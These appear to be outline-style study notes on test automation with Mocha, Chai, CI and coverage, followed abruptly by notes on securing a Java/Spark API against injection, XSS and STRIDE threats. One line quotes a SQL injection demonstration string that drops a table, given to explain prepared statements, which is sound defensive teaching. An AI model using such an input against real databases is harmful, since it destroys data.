				□ Middleware handles logic such as calculating total price, error handling, validating input, logging requests

		○ Unit Testing Principles

			§ Purpose: Validate small, isolated pieces of functionality (e.g., a middleware function).

			§ Characteristics:

				□ Fast (milliseconds)

				□ Simple

				□ Test only one thing at a time

		○ Testing Frameworks and Tools

			§ Mocha → testing framework (supports BDD-style tests).

			§ Chai → assertion library (verifies expected outcomes).

			§ Sinon → mocks and stubs dependencies (fakes objects/data to isolate tests).

		○ Practical Example: Testing calculateTotalPrice Middleware

			§ Setup:

				□ Import the middleware under test

				□ Mock req (request) object with items and quantities

				□ Mock res object (empty)

				□ Use sinon.spy() to track the next() call

			§ Tests Written:

				□ Should calculate total price → verifies correct calculation of item totals.

				□ Should handle empty cart → ensures total is 0 when req.items is empty.

				□ Should handle missing quantities → ensures total is 0 if no quantity exists for an item.

			§ Execution:

				□ un with npx mocha test/unit/calculateTotalPrice.test.js

				□ Output shows all tests passing in ~6ms.



Integration Test

	• Integration tests validate that different parts of an application work together seamlessly. Unlike unit tests (which test small, isolated pieces), integration tests focus on cross-module processes and end-to-end flows. They give confidence that the system behaves correctly when multiple components interact.

	• Key Concepts

		○ Purpose of Integration Tests

			§ Ensure whole-system functionality, not just isolated parts.

			§ Detect failures caused by interactions between modules.

			§ Cover cross-module processes that can’t be validated with unit tests.

			§ Useful when some parts of code are not unit-testable in isolation.

		○ Example: AI Animal Art Application

			§ Frameworks \& Tools Used:

				• Mocha → test framework (BDD style)

				• Supertest → simulate HTTP requests

				• Chai → assertions

				• SQLite (in-memory) → isolated test DB (avoids affecting production data)

			§ Test File: routes.test.js

				• Before Hook → creates items and cart tables, inserts initial data

				• After Hook → drops tables to clean up after test

		○ Integration Tests Implemented

			§ Add to Cart (POST request)

				• Simulates adding item with ID 1

				• Verifies response status, redirect URL, and database insertion

			§ Display Cart Page (GET request)

				• Inserts item with ID 1, quantity 2

				• Simulates request to /cart

				• Verifies status and that the cart page includes item name

			§ Checkout Page (GET request)

				• Inserts item with ID 1, quantity 2

				• Simulates request to /checkout

				• Verifies status and presence of message "Thanks for your order."

		○ Performance \& Characteristics

			§ Still fast (55ms), but slower than unit tests (6ms) because:

				• Requires DB queries

				• Simulates HTTP requests

				• Waits for responses

			§ Provides broader system confidence at a higher cost compared to unit tests.



UI Test

	• UI tests (also called end-to-end or functional tests) validate complete application workflows by simulating real user interactions in a browser. They ensure the frontend UI, backend systems, and databases all work together correctly. While extremely valuable, they are slower, harder to set up, and more resource-intensive compared to unit and integration tests.

	• Key Concepts

		○ Role of UI Tests

			§ Complement lower-level tests (unit, integration) by covering gaps.

			§ Provide a user’s perspective on whether the application works as expected.

			§ Simulate real-world workflows → e.g., add to cart → checkout.

			§ Act as a form of integration testing, since they exercise the full system stack.

		○ Technical Characteristics

			§ Always run in a browser (Chrome, Firefox, etc.).

			§ Require specific browser versions and environments (harder setup).

			§ Slower execution due to many moving parts: launching browser, rendering UI, simulating clicks, waiting for responses.

				• Unit test: ~5ms

				• Integration test: ~50ms

				• UI test: ~624ms (~1s)



#### How to Approach Automation



Get the Whole Team Involved

	• For test automation to succeed in a software delivery project, it must be a shared responsibility across the entire team—not just testers. Developers, testers, and business stakeholders (like product managers and business analysts) all play essential roles in planning, executing, and maintaining an effective, valuable automation strategy.

	• Key Concepts

		○ Team Involvement

			§ Whole team participation: developers, testers, product managers, and business analysts.

			§ Collaboration ensures that test automation reflects both technical needs and business priorities.

			§ Creates shared accountability → quality is everyone’s responsibility.

		○ Planning and Strategy

			§ Begin with a shared big picture → align expectations across roles.

			§ Hold cross-functional brainstorming sessions to define what makes a “good test suite.”

			§ Use models like the Agile Testing Quadrants and the Test Pyramid to structure discussions about:

				• Types of tests needed

				• Test tools to be used

				• Ownership of different test levels

			§ Ownership of Tests

				• Unit tests → typically owned by developers (written during development).

				• Integration tests → often shared between developers and testers.

				• UI tests → usually owned by testers.

				• Ownership isn’t exclusive—team members can and should help each other.

			§ Ongoing Collaboration

				• Hold retrospectives every few months to reflect on what’s working, what needs improvement.

				• Encourage knowledge-sharing and cross-support:

					® Stakeholders help identify high-priority scenarios.

					® Stakeholders help identify high-priority scenarios.

					® Testers help developers with edge cases.

					® Developers assist testers in writing UI scripts.

					® Testers and developers report results back to stakeholders.

		○ Sustainability \& Evolution

			§ Test automation is an ongoing process—new tests will always be added, and old ones may need maintenance.

			§ Teams should work to keep the suite lean, valuable, and maintainable.

			§ A teamwide investment in automation leads to a robust and reliable test suite.

			



Make a Strategy

	• Before writing tests, teams should plan and document a clear testing strategy. This involves identifying priority features, deciding what to automate versus keep manual, defining the scope of test types, and determining the resources and environments required. A strategy ensures test automation is efficient, maintainable, and aligned with business priorities.

	• Key Concepts

		○ Prioritize Features

			§ Start with business stakeholders → they provide the list of highest priority features.

			§ Align testing with business value and critical functionality.

		○ Decide What to Automate vs. Manual

			§ Good candidates for automation:

				• High-impact features

				• Tedious, repetitive tasks

				• Scenarios with predictable, consistent results

			§ Manual testing is better for exploratory, usability, or one-off checks.

		○ Apply the Test Pyramid

			§ Push automation to the lowest level possible:

				• Unit tests → largest number, fastest feedback

				• Integration tests → moderate number

				• UI tests → fewest, only for critical workflows

			§ If a scenario can be validated without the UI, avoid UI automation to reduce complexity and execution time.

		○ Define Test Suite Scope Early

			§ Decide which test types (unit, integration, UI, others like performance/security) will be included.

			§ Define scope early, but remain flexible for changes later in the project.

		○ Plan Resources

			§ Consider what’s needed for test automation success:

				• Test data → how it will be used, created, managed

				• Tooling → frameworks and libraries for building/running tests

				• Test environments → availability for both automated and manual testing

			§ Make a list of resources required to support testing efforts.

		○ Document the Testing Strategy

			§ Captures decisions, scope, and resources.

			§ Serves as guidance for current and future teammates.

			§ Provides a consistent approach for planning, executing, and maintaining automation.



Test Tools

	• Choosing the right test tools should follow test strategy decisions, not precede them. Teams should first define how they want tests to be structured, then evaluate and experiment with tools that best fit their needs. The process should be collaborative, criteria-based, and iterative, leading to better collaboration and more effective test automation.

	• Key Concepts

		○ Tools Come After Strategy

			§ Don’t pick tools too early — first decide:

				• What types of tests (unit, integration, UI, etc.) will be automated.

				• How tests will be expressed (style, frameworks, BDD vs TDD, etc.).

			§ Avoid limiting options by prematurely locking into a toolset.

		○ Baseline Requirements

			§ Two baseline criteria for selecting tools:

				• Type of test to implement (unit, integration, UI, performance, etc.).

				• Programming language in which the tests will be written.

			§ Example: choosing a JavaScript unit testing framework if the project code is JS.

		○ Promote Cross-Functional Collaboration

			§ Prefer tools that enable collaboration among:

				• Developers (writing unit/integration tests).

				• Testers (creating UI or exploratory tests).

				• Business stakeholders (contributing scenarios, reviewing results).

			§ Collaboration improves code testability and reduces defects.

		○ Experimentation with Spikes

			§ Use spikes (small experiments) with potential tools to:

				• Learn how they work technically.

				• Explore ease of use, integrations, and limitations.

				• Document pros and cons.

			§ Bring results back to the larger team for informed discussion.

		○ Decision-Making

			§ There is no single perfect tool for every project.

			§ Goal: select the best-fit tools for each type of testing based on team needs and findings.

			§ The decision should be team-based and consensus-driven.



Development Process

	• Different types of automated tests should be written and executed at specific points in the software delivery life cycle. Establishing clear processes for when to write and when to run tests (both locally and in CI/CD) ensures consistent quality, faster feedback, and higher confidence in software changes.

	• Key Concepts

		○ When to Write Tests

			§ Unit tests → written during development, ideally using Test-Driven Development (TDD) (tests written before code).

			§ Integration tests → also written during development, once features are far enough along to test multiple components together.

			§ UI tests → can start during development, but completed only after the feature is fully developed.

		○ When to Run Tests

			§ Local Execution:

				• Developers should run tests locally before making code changes.

				• Ensures immediate feedback and prevents breaking builds.

			§ Continuous Integration (CI):

				• Test suite should run automatically after code is committed.

				• Provides fast, automated verification in shared environments.

		○ Best Practices

			§ Run tests frequently throughout development.

			§ Ensure test results remain green (passing) to maintain trust in the test suite.

			§ Build processes where testing is an integral part of daily workflow, not an afterthought.

			§ Regular testing improves team discipline, skill, and confidence with automation.



Follow Test Design Patterns

	• Using design principles and patterns in test automation helps keep tests consistent, maintainable, and cost-effective over the long term. By reducing duplication, improving readability, and ensuring clear structure, teams can build test suites that provide fast, useful feedback and are easier to update as systems evolve.

	• Key Concepts

		○ Importance of Test Design Patterns

			• Reduce the cost of writing and maintaining automated tests.

			• Ensure tests are understandable, reusable, and reliable.

			• Provide a shared structure and style for the team to follow.

		○ Core Principles \& Practices

			• DRY (Don’t Repeat Yourself):

				□ Avoid duplication in test code.

				□ Shared/reusable components mean updates only need to be made in one place.

			• DSL (Domain-Specific Language):

				□ Use descriptive, meaningful names for items in the test application.

				□ Establish a common language for both code and tests → improves communication across the team.

			• Single Purpose per Test:

				□ Each test should validate one behavior only.

				□ Results in clearer scope, easier debugging, and simpler updates when business rules change.

			• Test Independence:

				□ Tests should be self-contained.

				□ They can run in any order without relying on data or state from other tests.

			• Behavior-Driven Steps:

				□ Tests should be written as steps describing behaviors.

				□ Technical details should be abstracted into helper functions outside the test.

				□ Makes tests more human-readable and easier to maintain.

		○ Documentation \& Team Alignment

			• Teams should define and document chosen test design patterns.

			• Store patterns in a project README or guidelines.

			• Ensures new and existing teammates can follow the same structure and principles.



#### Testing Tools



Framework

	• A test framework is the foundation of a complete test automation project. Frameworks provide structure, consistency, and reusable code for tests, reducing setup time and improving collaboration. Different frameworks exist for different languages and testing needs (unit, integration, UI, BDD), so teams should evaluate options based on their project context.

	• Key Concepts

		○ Role of a Test Framework

			§ Provides a structured way to write and organize tests.

			§ Enables consistency across test suites.

			§ Supports reusable test code for common actions.

			§ Reduces the overhead of designing a test system from scratch.

		○ Popular Frameworks for JavaScript

			§ Mocha

				• Works well for Node.js apps.

				• Supports browser testing, async tests, built-in runner, and any assertion library.

			§ Jasmine

				• Framework-agnostic for JavaScript.

				• Doesn’t require a browser or DOM.

				• Clean, simple syntax, comes with its own runner.

			§ Jest

				• Created by Facebook, popular for React testing.

				• Zero configuration with new React projects.

				• Includes built-in runner, mocking, and code coverage reporting.

		○ UI Testing Frameworks

			§ Selenium

				• Classic UI automation tool.

				• Works with JavaScript and integrates with Mocha, Jasmine, Jest.

			§ Cucumber

				• Behavior-Driven Development (BDD) framework.

				• Uses plain language (Given-When-Then) to define tests.

				• Often paired with Selenium for UI scenarios.

			§ Cypress.io

				• Modern, fast, reliable UI testing framework.

				• Works directly in the browser.

				• Easy setup and widely used in modern web projects.

		○ Benefits of BDD Support

			§ Many frameworks support BDD (Behavior-Driven Development).

			§ Encourages writing tests in a clear, scenario-based format.

			§ Improves team collaboration, making tests understandable by non-technical stakeholders.

		○ Recommendations

			§ Using a prebuilt framework (e.g., Mocha, Jasmine, Jest, Cypress) is highly recommended:

				• Saves time → faster setup.

				• Provides proven structure.

				• Allows the team to focus on writing tests instead of building custom frameworks.

			§ Teams should investigate options and select the framework best aligned with their app type, language, and team workflow.



Assertion Library

	• Assertions are the core of automated testing, giving tests meaning by checking whether actual results match expected results. Different assertion libraries exist, each with their own syntax and features, but the goal is always the same: to make test results clear, readable, and reliable.

	• Key Concepts

		○ Role of Assertions

			§ Assertions validate outcomes of code execution.

			§ A test fails when an assertion shows that expected ≠ actual.

			§ They are the “backbone” of tests, turning code execution into meaningful pass/fail results.

		○ Types of Assertion Libraries

			§ Built-in libraries (no extra dependencies):

				• Assert → built into Node.js, simple and minimal.

				• Jasmine and Jest → come with their respective frameworks.

			§ Standalone / BDD-style libraries (optional for flexibility):

				• Chai → powerful with expect.to.equal style syntax, supports plugins and integrations.

				• Unexpected → very readable string-like syntax, highly extensible, works with any framework.

		○ Syntax \& Examples

			§ Assert → assert.equal(actual, expected)

			§ Jasmine / Jest → expect(actual).toEqual(expected)

			§ Chai → expect(actual).to.equal(expected)

			§ Unexpected → expect(actual, 'to equal', expected)

			§ All provide ways to express expected outcomes clearly, just with different wording.

		○ Best Practices

			§ Prefer using an assertion library that comes built-in (Node.js Assert, Jasmine, Jest) to avoid unnecessary dependencies.

			§ Choose a standalone library (e.g., Chai, Unexpected) if:

				• You need more flexibility or plugins.

				• You want syntax that feels more natural to your team.

			§ Focus on readability—assertions should make it obvious what’s being tested.

			§ Pick one style and stay consistent across the project.



Test Results

	• Once tests are written, they need to be run repeatedly, easily, and consistently. Test runners (like Mocha, Jasmine, or Jest) provide ways to execute tests and display results, and teams should ensure running tests is simple and results are clear and interpretable.

	• Key Concepts

		○ Importance of Running Tests

			• Tests are meant to be run over and over throughout development.

			• Running should be repeatable, quick, and reliable.

			• Results must provide confidence by being easy to read and interpret.

		○ Running Tests with Mocha (Example)

			• Run a single test file:	npx mocha test/unit/calculateTotalPrice.test.js

			Run all unit tests in a directory:	npx mocha test/unit/\*.js

			• Output displayed in the terminal shows test results (pass/fail, details).

		○ Using NPM Scripts

			• package.json → contains scripts section for test automation.

			• Example script:

				"unit-test": "mocha test/unit/\*.js"

			• Run with:

				npm run unit-test

			• Benefits:

				• Provides a shortcut for common test commands.

				• Can define multiple variations of test scripts (e.g., unit, integration, coverage).

		○ Frameworks \& Reporting

			• Jasmine and Jest run tests similarly (via CLI + configuration).

			• All major test frameworks provide basic built-in reporting (summary of results).

			• Reports can be customized or extended with other tools for more detailed output.

		○ Best Practices'

			• Keep test execution simple → one easy command.

			• Ensure results are readable and meaningful to developers and stakeholders.

			• Teams may enhance reports if more detail is important (e.g., HTML reports, CI/CD dashboards).



#### Decide What to Automate



Scenarios to Automate

	• When planning test automation, teams should brainstorm and identify scenarios worth automating for each new feature. The goal is to generate as many potential scenarios as possible, then refine them later. Automating common, high-value workflows (like adding items to a cart or checking out) ensures reliable coverage of critical user actions.

	• Key Concepts

		○ Brainstorming Scenarios

			• Take 10 minutes with the team for each new feature to write down all possible scenarios.

			• Don’t filter ideas at this stage—quantity over quality.

			• Capture even “off the wall” ideas; refinement comes later.

		○ Example: AI Animal Art Application

			• Key user workflows that can be turned into automated test scenarios:

				□ View products available for sale on homepage.

				□ Add item to cart (single item).

				□ Add multiple quantities of the same item to the cart.

				□ Add different types of items to the cart.

				□ View cart → confirm all items and total price are displayed.

				□ Update quantity of an item (e.g., cat item → quantity = 0 removes item).

				□ Update multiple item quantities or remove multiple items.

				□ Clear entire cart (last item set to zero empties cart).

				□ Verify cart updates correctly when items are removed.

				□ Checkout process → complete order successfully.

		○ Best Practices

			• Use common user journeys as inspiration (shopping flow, checkout flow, etc.).

			• Prioritize automating high-value, repetitive, and critical scenarios.

			• Understand that the initial list is not exhaustive; more scenarios will be added over time.



Give Each Scenario a Value

	• After brainstorming test scenarios, the next step is to evaluate and prioritize them by assigning a value score (1–5). This ensures that test automation efforts focus on the most important, distinct, and high-value features first, making testing more efficient and impactful.

	• Key Concepts

		○ Scoring System

			§ Use a 1–5 scale to assign value to each scenario.

			§ Criteria for scoring:

				□ Importance of the feature (business criticality).

				□ Likelihood of being fixed if broken (response priority).

				□ Distinctness of the scenario (how unique it is vs. overlapping with others).

		○ Team Involvement

			§ Scores should be assigned collaboratively with stakeholders.

			§ Use group judgment and discussion to align priorities.

			§ Helps create consensus and shared understanding of what matters most.

		○ Example Evaluations (AI Animal Art App)

			§ View Products for Sale → 5 (critical, distinct, must-have).

			§ Add Item to Cart → 5 (high importance, always fixed immediately).

			§ Add Multiple Items to Cart → 4 (important but less distinct).

			§ Remove Item from Cart → 4 (valuable but slightly lower than adding items).

			§ Checkout (Order) → 5 (highest importance, revenue-critical, always fixed first).

		○ Outcome

			§ Produces a prioritized list of scenarios ranked by value.

			§ Surfaces the most valuable tests to automate first.

			§ Ensures limited resources are used efficiently, covering business-critical paths.



Risk of Automation

	• After assigning value scores to test scenarios, teams should also assign risk scores (1–5). Risk scoring evaluates how critical a feature is by considering both its impact if broken and its probability of use by customers. This helps prioritize automation for the features most essential to user experience and business continuity.

	• Key Concepts

		○ Risk Scoring Method

			• Assign a score of 1–5 to each scenario.

			• Based on two criteria:

				□ Impact → What happens to customers if the feature is broken?

				□ Probability of Use → How frequently will customers use this feature?

		○ Example Risk Evaluations (AI Animal Art App)

			• View Products for Sale → 5 (high impact, high probability).

			• Add Item to Cart → 5 (critical function, used frequently).

			• Add Multiple Items to Cart → 4 (important, frequently used, but slightly less critical).

			• Order Checkout → 5 (highest impact, essential for revenue, high use).

		○ Purpose of Risk Scoring

			• Surfaces the highest-risk features that require strong test coverage.

			• Ensures that automation prioritizes areas where failures would cause the greatest damage.

			• Complements value scoring by adding another dimension to prioritization.

		○ Outcome

			• Produces a risk-ranked list of scenarios.

			• Helps teams decide which tests are most critical to automate first.

			• Guides test planning toward features that are both high-value and high-risk.



The Cost of Automation

	• Beyond value and risk, teams must also consider the cost of automation when prioritizing test scenarios. Assigning a cost score (1–5) helps quantify the effort required to write and maintain tests, ensuring teams balance business impact with development effort when deciding what to automate.

	• Key Concepts

		○ Cost Scoring

			§ Assign a score of 1–5 for each scenario.

			§ Factors considered:

				□ Ease of writing the test script.

				□ Speed of implementation (how quickly it can be scripted).

		○ Example Cost Evaluations (AI Animal Art App)

			§ View Products for Sale → 5 (very easy and quick).

			§ Add Item to Cart → 5 (easy and quick).

			§ Remove Single Item from Cart → 4 (easy but depends on first adding an item).

			§ Remove Multiple Items from Cart → 3 (requires adding multiple items first, more setup).

			§ Order Checkout → 4 (easy but depends on prior cart setup).

		○ Insights

			§ Cost varies more widely than risk or value scores.

			§ Some tests are highly valuable and risky, but expensive to automate (due to dependencies or setup).

			§ Cost scoring provides a realistic view of effort vs. payoff.

		○ Purpose

			§ Helps teams prioritize automation by balancing:

				□ Value (business importance).

				□ Risk (impact + frequency of use).

				□ Cost (effort to automate).

			§ Supports informed decision-making about what scenarios should be automated first, and which might stay manual.



Select What to Automate

	• Once value, risk, and cost scores have been assigned to test scenarios, teams can use the combined data to prioritize which scenarios to automate. By summing the scores and applying a threshold, the team focuses on automating the highest-priority scenarios first, ensuring testing delivers maximum impact with available resources.

	• Key Concepts

		○ Using Combined Scoring

			§ Each scenario has three scores: Value + Risk + Cost.

			§ Add them up for a total score.

			§ Higher totals → stronger candidates for automation.

		○ Example Scoring Scale

			§ 13–15 points → Automate these scenarios.

			§ 12 or less → Do not automate (or lower priority).

			§ Note: Thresholds can vary depending on team needs and project scope.

		○ Benefits of the Approach

			§ Provides a quantitative method for selecting automation candidates.

			§ Balances business importance (value), user impact (risk), and effort (cost).

			§ Helps teams avoid over-investing in low-value or high-cost scenarios.

		○ Flexibility

			§ The model is not rigid—adapt thresholds and scoring methods to fit project or organizational needs.

			§ Recognizes that not all features will score highly, but ensures resources go to top-priority scenarios first.

			§ Lower-priority scenarios may still be tested manually.



#### Adopt Test Automation



Maintain Standards

	• Test automation is an ongoing process that requires consistent investment, discipline, and adherence to good standards. By focusing on value, reliability, and speed, teams can maintain a healthy, sustainable, and effective test suite over time.

	• Key Concepts

		○ Valuable Tests

			• Tests should always deliver meaningful value.

			• Quality over quantity → focus on important scenarios, not just number of tests.

			• Regularly review and improve existing tests (e.g., retrospectives).

			• Treat test code like production code—maintain it, refactor it, and keep it clean.

		○ Reliable Tests

			• Tests must provide the same results consistently.

			• Have a plan for handling failures (since they’re inevitable).

			• Make tests independent—execution of one test should not affect others.

			• Run tests in a dedicated environment to prevent interference from other processes.

		○ Fast Tests

			• Speed matters for fast build times and quicker releases.

			• Use parallelization to run multiple tests concurrently.

			• Limit UI tests (which are slower) and focus more on lower-level tests (unit/integration) for faster feedback.

		○ Long-Term Sustainability

			• Following these three rules ensures a test suite that is:

				□ Valuable (aligned with business needs).

				□ Reliable (trustworthy results).

				□ Fast (efficient feedback loop).

			• A disciplined approach makes a huge difference over time as the project grows.



Make a Maintenance Plan

	• Test automation is not a one-time effort—it requires ongoing maintenance to remain effective. A solid maintenance plan addresses adding new tests, updating existing ones, and fixing failures, ensuring the test suite stays relevant, reliable, and supports continuous delivery with confidence.

	• Key Concepts

		○ Adding New Tests

			§ Every new feature requires new automated tests.

			§ Teams working on new functionality should discuss:

				□ How the feature will be tested.

				□ What types of tests (unit, integration, UI) will be created.

		○ Updating Old Tests

			§ Applications evolve over time, making some tests outdated.

			§ Maintenance activities include:

				□ Updating test data.

				□ Adjusting assertions to reflect changed functionality.

				□ Deleting irrelevant tests if features are removed or redesigned.

		○ Fixing Failures

			§ Builds must always stay green (passing).

			§ Failures fall into two categories:

				□ Flaky/random failures → Mitigate by rerunning or isolating them until stabilized.

				□ Legitimate failures → Investigate immediately, as they may signal a real bug.

					® Requires fixing the bug or reverting the code that introduced it.

		○ Best Practices for Maintenance

			§ Isolate flaky tests to prevent them from blocking reliable builds.

			§ Continuously improve flaky tests before reintroducing them into the main suite.

			§ Prioritize fixing legitimate failures quickly to maintain trust in the suite.

			§ Regularly revisit the test suite to ensure it reflects the current state of the application.

		○ Outcome

			§ A clear maintenance plan ensures that:

				□ New features are covered.

				□ Old/irrelevant tests don’t clutter the suite.

				□ Failures are handled systematically.

			§ This creates a robust, sustainable automation suite that evolves with the product.



Use Continuous Integration

	• Continuous Integration (CI) is the best way to repeatedly and reliably run automated tests across environments. CI ensures that tests run automatically on code changes or scheduled intervals, providing faster feedback, catching bugs earlier, and maintaining software quality.

	• Key Concepts

		○ Purpose of Continuous Integration

			§ Automated tests can be run over and over consistently.

			§ CI enables tests to be triggered:

				□ On code pushes (e.g., to GitHub).

				□ On pull requests.

				□ On a schedule (e.g., hourly or nightly).

			§ Benefit: Catches bugs earlier compared to manual, ad hoc local testing.

		○ Choosing a CI Solution

			§ Many CI tools are available (e.g., Jenkins, CircleCI, GitHub Actions).

			§ Criteria to consider:

				□ Cost

				□ Ease of use

				□ Maintenance overhead

				□ Support

		○ Example: GitHub Actions Setup

			§ GitHub Actions provides free CI for public repos.

			§ Workflow is defined in a YAML file (.github/workflows/node.js.yaml).

			§ Example configuration:

				□ Triggered on push or pull request to main.

				□ Runs on Ubuntu with a Node.js version matrix (can be limited to latest).

				□ Steps:

					® Checkout project.

					® Install dependencies (npm ci).

					® Start server (npm start \&).

					® Run unit tests (npm run unit-test).

					® Run integration tests (npm run integration-test).

					® Run UI tests (npm run UI-test).

		○ Workflow Execution

			§ Once committed, workflows appear in the Actions tab of the repo.

			§ Developers can view:

				□ Build status (pending, success, failed).

				□ Detailed logs of each step.

			§ Example: build completed successfully in 35 seconds.

		○ Benefits of CI for Automated Testing

			§ Reliability: Ensures tests run consistently in controlled environments.

			§ Early detection: Bugs caught sooner in the pipeline.

			§ Speed: Automates repetitive validation, speeding up delivery.

			§ Transparency: Team can see real-time test results and build history.



Measure Code Coverage

	• Code coverage is a widely used metric for evaluating automated tests. It shows what percentage of the application’s code is executed during testing, helping teams identify well-tested and under-tested areas. While coverage tools provide valuable insights, coverage should be used as a guidance metric—not a strict target—to avoid focusing on numbers instead of meaningful tests.

	• Key Concepts

		○ What Code Coverage Measures

			§ Statement coverage → percentage of statements executed.

			§ Branch coverage → percentage of decision branches tested (if/else paths).

			§ Function coverage → percentage of functions invoked.

			§ Line coverage → percentage of lines executed.

		○ Benefits of Code Coverage

			§ Helps visualize test quality (what’s covered vs. uncovered).

			§ Identifies gaps in test coverage.

			§ Coverage tools are often free and easy to set up, especially for open-source projects.

			§ Provides reports that highlight coverage in color (green = high, yellow = medium, red = low).

		○ Example: Istanbul / NYC

			§ Istanbul is a popular tool for JavaScript projects.

			§ NYC is its CLI interface.

			§ Setup:

				□ Install with npm install --save-dev nyc.

				□ Add a test-coverage script in package.json (e.g., "nyc mocha test").

				□ Run with npm run test-coverage.

			§ Generates a report showing coverage by file, including uncovered lines.

		○ Best Practices

			§ Always measure coverage to inform test improvement.

			§ Don’t chase 100% coverage:

				□ It may lead to writing unnecessary or low-value tests.

				□ Can increase maintenance cost without improving quality.

			§ Instead, focus on:

				□ High-value scenarios.

				□ Areas with low or critical coverage.

				□ Using coverage data to make informed test decisions.







	• Build the API on a secure-by-default foundation: clean project scaffolding, tight DB usage, strict input validation, and output hardening. Stop entire vulnerability classes early (SQLi, XSS, ReDoS), then layer advanced controls later.

	• Example app \& stack (Natter)

		○ Endpoints (REST/JSON over HTTP):

			• POST /spaces (create space)

			• POST /spaces/{id}/messages, GET /spaces/{id}/messages\[?since=], GET /spaces/{id}/messages/{msgId} 

			• Moderator: DELETE /spaces/{id}/messages/{msgId}

		○ Tech: Java 11, Spark (HTTP), H2 (in-mem), Dalesbred (DB), json.org (JSON), Maven.

		○ Pattern: Controllers hold core logic; Spark routes + filters handle HTTP/security.

	• Secure development fundamentals

		○ Three-phase handler: parse → operate → respond (separate concerns, easier to secure \& test).

		○ Filters: before (validate inputs), after (set types), afterAfter (headers for all responses, incl. errors).

		○ Avoid info leaks: don’t expose stack traces, framework versions (e.g., blank out Server).

	• Injection attacks (and the fix)

		○ What went wrong: string-built SQL with user input ⇒ SQL injection (demonstrated '); DROP TABLE spaces; --).

		○ Primary defense: prepared/parameterized statements everywhere (placeholders ?, values bound separately).

		○ Secondary containment: DB least privilege user (only SELECT, INSERT), so even if SQLi appears, blast radius is small.

		○ Don’t rely on escaping; it’s brittle across engines/versions.

	• Input validation (allowlist mindset)

		○ Validate size, type, charset, format before using data or touching the DB.

		○ Prefer allowlists (e.g., username regex \[A-Za-z]\[A-Za-z0-9]{1,29}) over blocklists.

		○ Watch for ReDoS: design regexes to avoid catastrophic backtracking; use simple checks when in doubt.

		○ Note: even with memory-safe languages, attackers can force resource exhaustion (e.g., huge arrays).

	• Output hardening \& XSS prevention

		○ Problem demo: reflected XSS via text/plain form trick, incorrect Content-Type, and echoing user input in error JSON.

		○ Defenses:

			• Enforce request media type: reject non-application/json bodies with 415.

			• Always set response type explicitly: application/json; charset=utf-8.

			• Never echo unsanitized input in errors; prefer generic messages or sanitize first.

			• Generate JSON via library, not by string concatenation.

	• Security headers to set on every response

		○ X-Content-Type-Options: nosniff – stop MIME sniffing (prevents JSON treated as HTML/JS).

		○ X-Frame-Options: DENY (and/or CSP frame-ancestors 'none') – mitigate clickjacking/data drag.

		○ X-XSS-Protection: 0 – disable legacy, unsafe browser XSS auditors on API responses.

		○ Cache-Control: no-store (+ proper Expires/Pragma as needed) – avoid sensitive data caching.

		○ Minimal CSP for APIs:

Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; sandbox

	• Error handling

		○ Map validation/parse issues to 400, missing records to 404, unexpected to 500; all in JSON; no stack traces.

	• Quick checklist you can reuse

		○ Scaffold API with controllers + Spark filters (or equivalent) to isolate security concerns.

		○ TLS (chapter 3), but now: enforce Content-Type: application/json on request; set correct response type.

		○ Prepared statements only; no string-built SQL.

		○ Run the app as a restricted DB user (POLA).

		○ Validate inputs (length, charset, format); design regexes to avoid ReDoS.

		○ Never echo raw input in errors; sanitize or generalize.

		○ Set nosniff / frame / CSP / cache headers on every response.

		○ Use JSON libraries for output; avoid manual string concatenation.

		○ Centralize exception → HTTP status mapping; keep responses minimal.

		○ Regularly re-test with “weird” inputs (quotes, long strings, mismatched media types).

#### Securing The Natter API



Main Idea

	• Harden the API by adding five security controls—rate-limiting, HTTPS/TLS, authentication, audit logging, and access control—placed in the right order so they collectively block STRIDE threats while preserving accountability.

	• Threats → controls (STRIDE map)

		○ Spoofing → Authentication (HTTP Basic)

		○ Tampering / Info disclosure → HTTPS/TLS (encrypt in transit)

		○ Repudiation → Audit logging (before and after each request)

		○ Denial of service → Rate-limiting (first gate)

		○ Elevation of privilege → Access control (ACLs + careful grant rules)

	• Implementation blueprint (in request order)

		○ Rate-limit early (e.g., Guava RateLimiter) → return 429 (+ Retry-After).

		○ Authenticate (don’t halt here—populate request.attribute("subject")).

		○ Audit log request start (assign audit\_id) and end (with status).

		○ Authorize (filters that enforce required perms per route) → 401 if unauthenticated (send WWW-Authenticate), 403 if authenticated but not allowed.

		○ Controller executes business logic.

	• Key concepts \& how to apply them

		○ Rate-limiting (availability)

			§ Apply before any heavy work (even before auth).

			§ Keep per-server limits beneath capacity; consider proxy/gateway limits too (defense in depth).

			§ Use 429 + Retry-After.

		○ Authentication (prevent spoofing)

			§ Use HTTP Basic for the chapter’s demo; credentials: Authorization: Basic <base64(user:pass)>.

			§ Only over HTTPS—Base64 is trivially decodable.

			§ Store passwords with Scrypt (or Argon2/Bcrypt/PBKDF2): unique salt, memory-hard params (e.g., 32768,8,1).

			§ Add /users registration endpoint that hashes \& stores pw\_hash.

		○ HTTPS/TLS (confidentiality \& integrity)

			§ Enable TLS in Spark (secure(...)); for dev, generate cert with mkcert (PKCS#12).

			§ Consider HSTS for real deployments (don’t set on localhost).

			§ Encrypt in transit now; chapter 5 covers at rest.

		○ Audit logging (accountability)

			§ Log attempted and successful actions: method, path, user, status, time, audit\_id (to correlate start/end).

			§ Write to durable storage (DB here; SIEM in prod).

			§ Follows separation of duties: access to logs should be restricted and distinct from admins.

		○ Access control (authorization)

			§ Model as ACLs per space (r, w, d), persisted in a permissions table.

			§ Enforce via route-specific filters (factory requirePermission(method, perm)):

				□ 401 when not authenticated; 403 when authenticated but lacking perms.

			§ Privilege escalation fix: only owners/moderators (rwd) can add members, or ensure granted perms ⊆ grantor’s perms.

	• Practical gotchas \& defaults

		○ Auth stage should not short-circuit; let access control reject so the attempt is logged.

		○ Return the right codes: 401 + WWW-Authenticate vs 403.

		○ Keep least privilege at the DB (from Ch.2) and at the app (minimal perms).

		○ Prefer defense in depth (proxy + app rate-limits; TLS + app checks).

	• Quick checklist to apply

		○ Global RateLimiter before everything → 429/Retry-After.

		○ Basic auth decoder → set subject if valid (Scrypt verify).

		○ Two audit filters (start/end) using audit\_id.

		○ Per-route before() filters enforcing ACL perms; correct 401/403 semantics.

		○ TLS on; consider HSTS in prod; never --insecure.

		○ Registration endpoint with input validation and Scrypt hashing.

		○ Member-add rule that avoids privilege escalation.

#### OAuth2 and OpenID Connect



Main Idea

	• Open your API to third-party apps safely by using OAuth2 for delegated authorization with scoped access tokens, validate those tokens securely (introspection or JWTs), and use OpenID Connect (OIDC) when you also need user identity/SSO.

